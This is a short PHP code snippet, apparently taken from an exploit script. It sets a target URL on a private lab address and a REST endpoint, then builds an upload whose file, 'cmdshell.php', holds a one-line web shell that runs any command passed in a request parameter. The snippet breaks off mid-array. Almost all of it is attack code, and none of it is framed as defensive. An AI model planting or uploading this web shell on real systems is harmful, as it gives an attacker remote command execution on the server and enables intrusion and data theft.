---
id: 236ad2b4-342c-414c-b5f8-79069f11a346
type: code
language: PHP
verified: false
created_at: '2020-03-17T00:09:17.041606+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 236ad2b4

**Language**: PHP

```php
$url = 'http://10.10.10.9';
$endpoint_path = '/rest';
$endpoint = 'rest_endpoint';

$file = [
    'filename' => 'cmdshell.php',
    'data' => '<?php system($_REQUEST["cmd"]); ?>'
```
